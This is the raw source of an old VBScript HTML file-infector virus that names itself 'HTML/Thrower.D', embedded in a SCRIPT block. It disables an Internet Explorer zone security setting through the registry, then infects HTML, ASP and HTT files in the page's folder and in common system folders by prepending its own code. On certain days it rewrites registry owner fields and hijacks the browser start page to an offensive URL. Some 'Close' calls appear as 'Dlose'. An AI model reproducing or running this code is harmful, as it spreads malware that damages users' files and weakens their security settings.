<SCRIPT language=VBScript><!--
On Error Resume Next
if location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  if location.protocol = "file:" then
	Set Kil13r = CreateObject("Scripting.FileSystemObject")
	HPath = Replace(location.href, "/", "\")
	HPath = Replace(HPath, "file:\\\", "")
	HPath = Kil13r.GetParentFolderName(HPath)
	Set Korea = document.body.createTextRange
	Call GetFolder(HPath)
	Call GetFolder("C:\")
	Call GetFolder("C:\Windows\")
	Call GetFolder("C:\My Documents")
	Call GetFolder("C:\Windows\¹ÙÅÁ È­¸é")
	Call GetFolder("C:\Windows\Desktop")
	Call GetFolder("C:\Windows\Web")
	Call GetFolder("C:\Windows\Web\Wallpaper")
	Call GetFolder("C:\Windows\Help")
	Call GetFolder("C:\Windows\Temp")
	Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	Call GetFolder("C:\Inetpub\wwwroot")
  end if
 End If
  If Day(Now()) = 22 or Day(Now()) = 23 or Day(Now()) = 24 Then
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\LicensingInfo", "ùÛ?ªÎå´íºªÏ¡¢ª³ªÎ«µ«¤«ÈªòìíÜâìÑªËÌ¸ªÆá®ª¦ª³ªÈªòï·ØÐª·ªÆª¤ªëªèª¦ªÇª¹¡£ ª³ª¾ªÃªÆÌ¸ªÆª¢ª²ªÆª¯ªÀªµª¤¡£"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "HTML/Thrower.D"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Ù£Ùíª·ªµªó23"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.netomo.com/cgi-bin/transkj.cgi?http://www.fuck-japan.com/"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://www.netomo.com/cgi-bin/transkj.cgi?http://www.fuck-japan.com/"
  End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
if Kil13r.FolderExists(InfPath) then
	Do
	 Set FolderObj = Kil13r.GetFolder(InfPath)
	 InfPath = Kil13r.GetParentFolderName(InfPath)
	 Set FO = FolderObj.Files
	 For each target in FO
		ExtName = lcase(Kil13r.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Thrower = Kil13r.OpenTextFile(target.path, 1, False)
			if Thrower.readline <> "<!--Thrower.D-->" then
				Thrower.Dlose()
				GetFile(target.path)
			else
				Thrower.Dlose()
			end if
		end if
	 next
	Loop Until FolderObj.IsRootFolder = True
end if
End Sub

Sub GetFile(GetFileName)
	Set Thrower = Kil13r.OpenTextFile(GetFileName, 1, False)
	FileContents = Thrower.ReadAll()
	Thrower.Dlose()
	Set Thrower = Kil13r.OpenTextFile(GetFileName, 2, False)
	Thrower.WriteLine "<!--Thrower.D-->"
	Thrower.Write("<html><body>" + Chr(13) + Chr(10))
	Thrower.WriteLine Korea.htmlText
	Thrower.WriteLine("</body></html>")
	Thrower.Write(FileContents)
	Thrower.Dlose()
End Sub

--></SCRIPT>
